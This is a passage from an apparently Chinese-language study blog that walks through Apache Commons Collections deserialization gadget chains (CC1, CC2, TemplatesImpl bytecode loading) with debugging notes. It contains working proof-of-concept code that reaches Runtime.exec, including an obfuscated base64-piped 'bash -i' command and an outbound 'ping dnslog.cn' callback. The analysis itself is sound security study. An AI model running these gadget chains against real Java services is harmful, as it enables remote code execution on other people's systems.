InvokerTransformer implements Transformer, Serializable {\n    //....\n    public Object transform(Object input) {\n        if (input == null) {\n            return null;\n        } else {\n            try {\n                Class cls = input.getClass();\n                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);\n                return method.invoke(input, this.iArgs);\n            }catch{\n                //...\n            }\n        }\n    }\n}\n```\n\n## TransformedMap\n\n借用一下`p`神在[JAVA安全漫谈](https://github.com/phith0n/JavaThings)中的[Java安全漫谈 - 09.反序列化篇(3)](https://wx.zsxq.com/dweb2/index/topic_detail/548841448822424)下的原话\n\n![image-20220802181051056](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802181051056.png)\n\n这里的**回调**感觉就是调用对应实现了`Transformer`接口的类的自定义的`transform`方法。\n\n其源码如下：\n\n```java\npublic class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable {\n    private static final long serialVersionUID = 7023152376788900464L;\n    protected final Transformer keyTransformer;\n    protected final Transformer valueTransformer;\n\n    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n        return new TransformedMap(map, keyTransformer, valueTransformer);\n    }\n\n    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {\n        super(map);\n        this.keyTransformer = keyTransformer;\n        this.valueTransformer = valueTransformer;\n    }\n    //...\n}\n```\n\n由于其构造函数是`protected`修饰的，所以通常是没办法在我们的代码中直接实例化对象出来的，那么就利用提供的`decorate`函数接口即可。\n\n## ConstantTransformer\n\n看源码就知道\n\n```java\npublic class ConstantTransformer implements Transformer, Serializable {\n    static final long serialVersionUID = 6374440726369055124L;\n\t//....\n    private final Object iConstant;\n\n//....\n\n    public ConstantTransformer(Object constantToReturn) {\n        this.iConstant = constantToReturn;\n    }\n//...\n    public Object transform(Object input) {\n        return this.iConstant;\n    }\n//...\n}\n```\n\n即构造函数的时候传入⼀个对象，当调用`transform`方法时再将这个对象返回，最开始我想着这不是多此一举吗，有什么用捏。后面才知道，这可能就是为了传递某些无法进行序列化的类吧，比如`Runtime`的。\n\n## InvokerTransformer\n\n这个可以说是很关键的一个类了，能执行任意方法。看下源码，主要关注三个参数的构造函数和`transform`函数。\n\n```java\npublic class InvokerTransformer implements Transformer, Serializable {\n    static final long serialVersionUID = -8653385846894047688L;\n    private final String iMethodName;\n    private final Class[] iParamTypes;\n    private final Object[] iArgs;\n\n\t//....\n    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {\n        this.iMethodName = methodName;\n        this.iParamTypes = paramTypes;\n        this.iArgs = args;\n    }\n\t//.....\n    public Object transform(Object input) {\n        if (input == null) {\n            return null;\n        } else {\n            try {\n                Class cls = input.getClass();\n                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);\n                return method.invoke(input, this.iArgs);\n            } catch{\n                //.....\n            }\n        }\n    }\n}\n\n```\n\n即当调用到该类的`transform`函数时，约等于执行`input.iMethodName(this.iArgs)`。\n\n## ChainedTransformer\n\n包含了一个`Transformer`的数组，即数组中前⼀个`Transformer`的`transform`函数执行的返回结果，作为后⼀个`Transformer`的`transform`函数的参数输入\n\n```java\npublic class ChainedTransformer implements Transformer, Serializable {\n    static final long serialVersionUID = 3514945074733160196L;\n    private final Transformer[] iTransformers;\n\t//....\n\n    public ChainedTransformer(Transformer[] transformers) {\n        this.iTransformers = transformers;\n    }\n\n    public Object transform(Object object) {\n        for(int i = 0; i < this.iTransformers.length; ++i) {\n            object = this.iTransformers[i].transform(object);\n        }\n        return object;\n    }\n\t//...\n}\n\n```\n\n比如如下在反序列化中常见的执行`Runtime.exec`的方法\n\n```java\nChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n    new ConstantTransformer(Runtime.class),\n    new InvokerTransformer(\"getMethod\", new Class[] {\n        String.class, Class[].class }, new Object[] {\n        \"getRuntime\", new Class[0] }),\n    new InvokerTransformer(\"invoke\", new Class[] {\n        Object.class, Object[].class }, new Object[] {null, new Object[0] }),\n    new InvokerTransformer(\"exec\", new Class[] {\n        String.class }, new Object[]{\"touch dddd\"})});\nchain.transform(123);//这个123没啥用,随便设置\n```\n\n那么实际的的调用链如下，实际调试一下应该更清楚一些。\n\n![未命名绘图](https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%BB%98%E5%9B%BE.png)\n\n所以通常情况下，我们就是需要找到能调用到某个对象的`transform`函数的链子。\n\n## TemplatesImpl\n\n这个不知道被设计出来干啥的，不过在`JAVA`反序列化中通常用来加载字节码。\n\n### 前置知识\n\n参考：[Java安全漫谈 - 13.Java中动态加载字节码的那些方法](https://wx.zsxq.com/dweb2/index/topic_detail/815544582812412)\n\n`JAVA`虚拟机`JVM`实际加载运行的是`.class`文件，而这个`.class`文件，里面的实际数据就是字节码。那么如果我们可以自定义一个类，其构造函数为打印`Hello World`，然后将之编译成`.class`文件，然后让`JAVA`去加载，就可以触发该类的构造函数了。\n\n那么这个加载`.class`文件的方法，就是`defineClass`，以下就是p神提供的一个例子，运行会打印出`Hello World`。\n\n```java\npackage test;\n\nimport java.lang.reflect.Method;\nimport java.util.Base64;\npublic class test {\n    public static void main(String[] args) throws Exception {\n        Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class,byte[].class, int.class, int.class);\n        defineClass.setAccessible(true);\n        byte[] code = Base64.getDecoder().decode(\"yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM\");\n        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), \"Hello\", code, 0, code.length);\n        hello.newInstance();\n    }\n}\n\n```\n\n那么我们需要寻找的链子，就是能够调用到`defineClass`方法的链子，这里就是`TemplatesImpl`，其调用链如下：\n\n```\nTemplatesImpl.newTransformer() ->TemplatesImpl.getTransletInstance() -> TemplatesImpl.defineTransletClasses()-> TransletClassLoader.defineClass()\n```\n\n相关实际调用截图如下\n\n### 链子\n\n#### TemplatesImpl.newTransformer()\n\n![image-20220803171708570](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171708570.png)\n\n#### TemplatesImpl.defineTransletClasses()\n\n![image-20220803171741367](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171741367.png)\n\n#### TransletClassLoader.defineClass()\n\n这里的`_bytecodes[i]`即为`TemplatesImpl`类中私有成员，我们可以通过反射来为其赋值。\n\n![image-20220803171936516](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171936516.png)\n\n\n\n## TrAXFilter\n\n该类未实现`Serializable`接口，无法进行序列化，所以使用的时候通常结合`ConstantTransformer`来搭配使用。主要关注其构造函数\n\n```java\npublic class TrAXFilter extends XMLFilterImpl {\n    //....\n    private TransformerImpl        _transformer;\n    //.....\n\n    public TrAXFilter(Templates templates)  throws\n        TransformerConfigurationException\n    {\n        //...\n        _transformer = (TransformerImpl) templates.newTransformer();\n        //...\n    }\n    //....\n}\n```\n\n即会依据传入的`Templates`类对象，来调用其`newTransformer`函数，这个是不是就是可以调用到之前提到的`TransformerImpl.newTransformer()`从而加载字节码呢。\n\n## InstantiateTransformer\n\n同样也是一个实现了`Transformer`接口的类，主要关注其构造函数和重写的`transform`函数\n\n```java\npublic class InstantiateTransformer implements Transformer, Serializable {\n    //......\n    private final Class[] iParamTypes;\n    private final Object[] iArgs;\n\n    private InstantiateTransformer() {\n        this.iParamTypes = null;\n        this.iArgs = null;\n    }\n\n    public InstantiateTransformer(Class[] paramTypes, Object[] args) {\n        this.iParamTypes = paramTypes;\n        this.iArgs = args;\n    }\n\n    public Object transform(Object input) {\n        try {\n            if (!(input instanceof Class)) {\n                throw new FunctorException(\"InstantiateTransformer: Input object was not an instanceof Class, it was a \" + (input == null ? \"null object\" : input.getClass().getName()));\n            } else {\n                Constructor con = ((Class)input).getConstructor(this.iParamTypes);\n                return con.newInstance(this.iArgs);\n            }\n        } catch (NoSuchMethodException var6) {\n            //...\n        }\n        //...\n    }\n}\n\n```\n\n可以看到有两个构造函数，当传入有参构造函数时，其成员`iParamTypes`和`iArgs`会被赋值，然后在其`transform`函数中，会依据成员`iParamTypes`和`iArgs`来生成实例化对象。\n\n```java\nConstructor con = ((Class)input).getConstructor(this.iParamTypes);\nreturn con.newInstance(this.iArgs);\n```\n\n那么我们就可以借助该类的`transform`函数，来生成`TrAXFilter`类的实例化对象，从而在`TrAXFilter`的构造函数中，调用到`TemplatesImpl.newTransformer()`来加载字节码，完成任意函数调用。\n\n\n\n# 经典链子CCI\n\n`ChainedTransformer->ConstantTransformer->InvokerTransformer`\n\n为了方便，自己命名为`CCI`\n\n## 前置知识\n\n可以使用`ChainedTransformer.transform()`来调用其中该数组中的各种`transformer`，从而获取`Runtime`来执行命令。举个简单的例子如下\n\n```java\nimport java.lang.reflect.Field;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\n\npublic class test {\n    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {\n        Field field = obj.getClass().getDeclaredField(fieldName);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n\n    public static void main(String[] args) throws Exception {\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n            new ConstantTransformer(Runtime.class),\n            new InvokerTransformer(\"getMethod\", new Class[] {\n                String.class, Class[].class }, new Object[] {\n                \"getRuntime\", new Class[0] }),\n            new InvokerTransformer(\"invoke\", new Class[] {\n                Object.class, Object[].class }, new Object[] {null, new Object[0] }),\n            new InvokerTransformer(\"exec\", new Class[] {\n                String.class }, new Object[]{\"touch abc\"})});\n        chain.transform(\"aaa\");//随便设置\n    }\n}\n```\n\n调用时`ChainedTransformer.transfor()`满足如下条件即可\n\n![image-20220802121441271](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802121441271.png)\n\n进入之后会一直循环调用\n\n![image-20220802121635026](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802121635026.png)\n\n直到最后调用到`Runtime的exec`\n\n![image-20220802122031069](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802122031069.png)\n\n## 实际使用\n\n调用`transform`数组获取`runtime`\n\n```java\nChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n    new ConstantTransformer(Runtime.class),\n    new InvokerTransformer(\"getMethod\", new Class[] {\n        String.class, Class[].class }, new Object[] {\n        \"getRuntime\", new Class[0] }),\n    new InvokerTransformer(\"invoke\", new Class[] {\n        Object.class, Object[].class }, new Object[] {null, new Object[0] }),\n    new InvokerTransformer(\"exec\", new Class[] {\n        String.class }, new Object[]{\"ping dnslog.cn\"})});\n\n//其中一种触发方式,LazyMap.get()\nHashMap innermap = new HashMap();\nLazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);\n//调用LazyMap.get方法\nTiedMapEntry tiedmap = new TiedMapEntry(map,123);\n```\n\n代表如下获取`Runtime`的链子\n\n![image-20220801101348788](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801101348788.png)\n\n从`LazyMap.get()`开始\n\n![image-20220801110714702](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png)\n\n这里的`factory`为`ChainedTransformer`，其`transform`为一个数组\n\n![image-20220802095635405](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802095635405.png)\n\n`key`为`123`可以随便设置，但是实际调试的时候不知道为什么进不去，应该是`p`神讲的\n\n![image-20220802100443587](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802100443587.png)\n\n所以导致运行到上述情况时，上层的`HashMap`中的key已经是一个进程了，所以有值了，导致调试无法进入。\n\n![image-20220802100604384](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802100604384.png)\n\n\n\n\n\n# 经典链子ITN\n\n`InvokerTransformer->TemplatesImpl.newTransformer`\n\n同样为了方便自己命名为`ITN`\n\n## 前置知识\n\n可使用`TemplatesImpl.newTransformer`来调用到`defineClass`加载字节码任意调用，给个简单的例子\n\n多方参考：\n\n[利用TemplatesImpl加载字节码 - (yang99.top)](http://www.yang99.top/index.php/archives/63/)\n\n[JavaDeserializeLab学习（jdk1.8.0_301） – maxzed](https://maxzed.top/2022/07/13/javadeserializelab学习（jdk1-8-0_301）/)\n\n```java\npackage test;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Map;\n\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\n\npublic class test {\n    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {\n        Field field = obj.getClass().getDeclaredField(fieldName);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n\n    public static void main(String[] args) throws Exception {\n        ClassPool pool = ClassPool.getDefault();\n        pool.insertClassPath(String.valueOf(AbstractTranslet.class));\n        CtClass ctClass = pool.get(test.class.getName());//新建一个test类，没啥用\n        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\n        String code = \"{java.lang.Runtime.getRuntime().exec(\\\"bash -c {echo,dG91Y2ggYWJj}|{base64,-d}|{bash,-i}\\\");}\";\n        ctClass.makeClassInitializer().insertAfter(code);\n        ctClass.setName(\"evil\");\n        byte[] bytes = ctClass.toBytecode();\n\n        TemplatesImpl obj = new TemplatesImpl();\n        setFieldValue(obj, \"_bytecodes\", new byte[][] {bytes});\n        setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\");\n        setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl());\n        obj.newTransformer();\n    }\n}\n```\n\n设置的命令为`touch abc`。\n\n调试如下，可以看到，满足`TemplatesImpl.newTransformer`调用时，存在`_name`，即可调用对应的`_bytecodes`的字节码。\n\n![image-20220802113412874](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802113412874.png)\n\n## 实际使用\n\n### JAVA版本限制\n\n参考：[BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html)\n\n也就是`Java 8u251`以后，`JAVA`里的`ClassLoader`被删除，但是官网的`JDK`里还是有的，所以跑上面的例子代码还是能跑通，但是如果实际环境中可能就不行了，这个不是很懂。\n\n那么如果没有`ClassLoader`的话，也就不存在下面的加载字节码的方法了，具体原因是`newTransformer`函数内部会调用到`ClassLoader`来加载字节码，这个可以参考如下：[利用TemplatesImpl加载字节码 - (yang99.top)](http://www.yang99.top/index.php/archives/63/)\n\n### 解析\n\n该链子的使用方法参考我熊哥的博客：[JavaDeserializeLab学习（jdk1.8.0_301） – maxzed](https://maxzed.top/2022/07/13/javadeserializelab学习（jdk1-8-0_301）/)\n\n加载字节码，直接运行所需命令\n\n```java\nClassPool pool = ClassPool.getDefault();\npool.insertClassPath(String.valueOf(AbstractTranslet.class));\nCtClass ctClass = pool.get(test.class.getName());//新建一个test类，没啥用\nctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\nString code = \"{java.lang.Runtime.getRuntime().exec(\\\"bash -c {echo,Li90ZXN0LnNo}|{base64,-d}|{bash,-i}\\\");}\";\nctClass.makeClassInitializer().insertAfter(code);\nctClass.setName(\"evil\");\n\nbyte[] bytes = ctClass.toBytecode();\nTemplatesImpl tempIm = new TemplatesImpl();\nsetField(tempIm, \"_name\", \"asd\");\nsetField(tempIm, \"_bytecodes\", new byte[][]{bytes});\nsetField(tempIm, \"_tfactory\", new TransformerFactoryImpl());\nInvokerTransformer invTransf = new InvokerTransformer(\"newTransformer\", null, null);\n\nHashMap innermap = new HashMap();\n\nLazyMap map = (LazyMap)LazyMap.decorate(innermap,invTransf);\n//调用Get方法\nTiedMapEntry tiedmap = new TiedMapEntry(map,tempIm);\n```\n\n代表如下运行字节码链子\n\n![image-20220802103631920](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802103631920.png)\n\n也是从`LazyMap.get()`开始，这里调试时上一层`HashMap`中就没有`key`值了，所以可以进去\n\n![image-20220802105100090](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105100090.png)\n\n然后进入`transform`中，可以看到对应的要执行的命令字节码\n\n![image-20220802105822797](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105822797.png)\n\n```\n[-54, -2, -70, -66, 0, 0, 0, 52, 0, 35, 10, 0, 3, 0, 13, 7, 0, 33, 7, 0, 15, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 11, 76, 116, 101, 115, 116, 47, 116, 101, +499 more]\n```\n\n对比一下在没有序列化时的数据\n\n![image-20220802105946768](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105946768.png)\n\n```\n[-54, -2, -70, -66, 0, 0, 0, 52, 0, 35, 10, 0, 3, 0, 13, 7, 0, 33, 7, 0, 15, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 11, 76, 116, 101, 115, 116, 47, 116, 101, +499 more]\n```\n\n是完全一样的，那么就会调用到`newTransform`来调用相关字节码\n\n参考：[Commons-Collections 1-7 利用链分析 – 天下大木头 (wjlshare.com)](http://wjlshare.com/archives/1535)\n\n\n\n# 经典链子CITTN\n\n`ChainedTransformer->ConstantTransformer->InstantiateTransformer->TrAXFilter->TemplatesImpl`\n\n同样为了方便自己命名为`CITTN`\n\n## 测试链\n\n即结合之前提到的这几个类，也能想出相关的链子，相关测试如下\n\n```java\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport javassist.*;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InstantiateTransformer;\n\nimport javax.xml.transform.Templates;\nimport java.lang.reflect.Field;\n\n\npublic class test {\n    public static void main(String[] args)  throws Exception {\n        ClassPool pool = ClassPool.getDefault();\n        pool.insertClassPath(String.valueOf(AbstractTranslet.class));\n        CtClass ctClass = pool.makeClass(\"test\");\n        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\n        String code = \"{java.lang.Runtime.getRuntime().exec(\\\"touch bbbb\\\");}\";\n        ctClass.makeClassInitializer().insertAfter(code);\n        ctClass.setName(\"evil\");\n\n        byte[] classBytes = ctClass.toBytecode();\n        TemplatesImpl templates = TemplatesImpl.class.newInstance();\n        setField(templates, \"_bytecodes\", new byte[][]{classBytes});\n        setField(templates, \"_name\", \"name\");\n        setField(templates, \"_class\", null);\n\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n                new ConstantTransformer(TrAXFilter.class),\n                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})\n        });\n        chain.transform(\"test\");\n    }\n    public static void setField(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n}\n\n```\n\n## 解析\n\n![image-20220806110014361](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110014361.png)\n\n首先自然还是`ChainedTransformer`中的数组调用`transform`函数，之后调用`ConstantTransformer`的`transform`函数，获取到`TrAXFilter`类后，再调用`InstantiateTransformer`的`transform`函数，其中会生成`TrAXFilter`的实例化对象\n\n![image-20220806112255293](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806112255293.png)\n\n随后即可进入`TrAXFilter`的构造函数，传入的`this.iArgs`即为实例化`InstantiateTransformer`时传入的`Templates`对象\n\n![image-20220806110523351](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806110523351.png)\n\n然后就调用到利用反射为`Templates`对象准备的字节码`_bytecodes`，从而完成任意函数执行。\n\n\n\n# 一、CC1\n\n## 前置知识\n\n主要是动态代理对象的知识\n\n参考：[Java安全漫谈 - 11.反序列化篇(5)](https://wx.zsxq.com/dweb2/index/topic_detail/118811585445582)\n\n### InvocationHandler\n\n有一个和`Transformer`接口很像的类`InvocationHandler`\n\n```java\npublic interface InvocationHandler {\n    public Object invoke(Object proxy, Method method, Object[] args)\n        throws Throwable;\n}\n```\n\n当该代理对象调用任意方法时，都会被替换为调用之前传入的实现了`InvocationHandler`类下重写的`invoke`方法，以下是个简单的例子。\n\n```java\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.Map;\n\n\npublic class test {\n    public static void main(String[] args) {\n        //声明一个实现了InvocationHandler接口的类\n        class Demo implements InvocationHandler{\n            protected Map map;\n            public Demo(Map map){\n                this.map = map;\n            }\n            @Override\n            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n                System.out.println(\"Calling invoke....\");\n                if (method.getName().compareTo(\"get\") == 0){\n                    System.out.println(\"Hook method: \" + method.getName());\n                    return \"Hacked return string\";\n                }\n                return method.invoke(this.map,args);\n            }\n        }\n\n        InvocationHandler invocationHandler = new Demo(new HashMap());\n        //代理时传入实现了InvocationHandler接口的类的实例对象,返回代理对象proxyMap\n        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler);\n        //当代理对象proxyMap调用任意方法时,都会被之前传入的实现了\n        //InvocationHandler接口的类下重写的invoke方法给替换掉\n        \n        //比如这里的put和get都会被Demo.invoke给替换掉\n        proxyMap.put(\"hello\",\"world\");\n        String result = (String) proxyMap.get(\"hello\");\n        System.out.println(result);\n    }\n}\n```\n\n那么就有希望调用到某个类的`invoke`函数了，这里的`CC1`即选取的尝试调用`AnnotationInvocationHandler.invoke()`\n\n## JAVA源码版本-8u40\n\n![image-20220803181047725](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803181047725.png)\n\n细节如下：\n\n```\nAnnotationInvocationHandler.readObject()\nMap(Proxy).entrySet()\nAnnotationInvocationHandler.invoke()\nLazyMap.get()\nChainedTransformer.transform()\n```\n\n## 限制\n\n`JDK`版本：`8u71`及以前版本，原因是在`8u71`之后的版本中`sun.reflect.annotation.AnnotationInvocationHandler.readObject()`函数发生了变化。\n\n## POC\n\n```java\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Map;\n\npublic class CC1 {\n    public static void main(String[] args) throws Exception{\n        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {\n            new ConstantTransformer(Runtime.class),\n            new InvokerTransformer(\"getMethod\", new Class[] {\n                String.class, Class[].class }, new Object[] {\n                \"getRuntime\", new Class[0] }),\n            new InvokerTransformer(\"invoke\", new Class[] {\n                Object.class, Object[].class }, new Object[] {\n                null, new Object[0] }),\n            new InvokerTransformer(\"exec\",\n                                   new Class[] { String.class }, new Object[]{\"touch aaaaa\"})});\n\n        HashMap innermap = new HashMap();\n        LazyMap map = (LazyMap) LazyMap.decorate(innermap,chain);\n\n        // 创建一个与代理对象相关联的InvocationHandler map_handler\n        Constructor handler_constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class);\n        handler_constructor.setAccessible(true);\n        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map);\n\n        // 创建代理对象proxy_map来代理map_handler，代理对象执行的所有方法都会替换执行InvocationHandler中的invoke方法\n        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler);\n\n        //再创建一个AnnotationInvocationHandler对象，用来触发代理对象proxy_map的方法执行,从而跳转AnnotationInvocationHandler.voker()\n        InvocationHandler handler = (InvocationHandler)handler_constructor.newInstance(Override.class,proxy_map);\n\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc1\"));\n            outputStream.writeObject(handler);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc1\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n\n    }\n}\n```\n\n## 解析\n\n### `AnnotationInvocationHandler.readObject()`\n\n![image-20220803201921921](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803201921921.png)\n\n### `AnnotationInvocationHandler.invoke()`\n\n![image-20220803203105622](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803203105622.png)\n\n### `LazyMap.get()`\n\n还是经典的链子`CIR`\n\n![image-20220801110714702](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png)\n\n\n\n\n\n# 二、CC2\n\n## JAVA源码版本-8u40\n\n![image-20220805162929023](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220805162929023.png)\n\n细节如下：\n\n```\nPriorityQueue.readObject()->heapify()->siftDown()->siftDownUsingComparator()\nTransformingComparator.compare()\nInvokerTransformer.transform()\nTemplateslmpl.newTransfomer()\n```\n\n`PriorityQueue`在`commons-collections4`下才开始有\n\n```xml\n<dependency>\n    <groupId>org.apache.commons</groupId>\n    <artifactId>commons-collections4</artifactId>\n    <version>4.0</version>\n</dependency>\n```\n\n## 限制\n\n`JDK`版本：暂无\n\n## POC\n\n```java\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.util.PriorityQueue;\n\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\n\nimport javassist.ClassPool;\nimport javassist.CtClass;\n\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\n\npublic class CC2 {\n    public static void main(String[] args) throws Exception {\n        //构建字节码\n        ClassPool pool = ClassPool.getDefault();\n        pool.insertClassPath(String.valueOf(AbstractTranslet.class));\n        CtClass ctClass = pool.makeClass(\"test\");\n        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));\n        String code = \"{java.lang.Runtime.getRuntime().exec(\\\"touch aaaa\\\");}\";\n        ctClass.makeClassInitializer().insertAfter(code);\n        ctClass.setName(\"evil\");\n\n        byte[] classBytes = ctClass.toBytecode();\n        TemplatesImpl templates = TemplatesImpl.class.newInstance();\n        setField(templates, \"_bytecodes\", new byte[][]{classBytes});\n        setField(templates, \"_name\", \"name\");\n        setField(templates, \"_class\", null);\n\n\n        Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\")\n                .getDeclaredConstructor(String.class);\n        constructor.setAccessible(true);\n        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\");\n\n        TransformingComparator comparator = new TransformingComparator(transformer);\n        PriorityQueue queue = new PriorityQueue(1);\n\n        Object[] queue_array = new Object[]{templates,1};\n        setField(queue,\"queue\",queue_array);\n        setField(queue,\"size\",2);\n        //设置comparator为TransformingComparator,进入siftDownUsingComparator\n        setField(queue,\"comparator\",comparator);\n\n        try{\n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2\"));\n            outputStream.writeObject(queue);\n            outputStream.close();\n\n            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2\"));\n            inputStream.readObject();\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n\n    }\n\n    public static void setField(Object obj, String 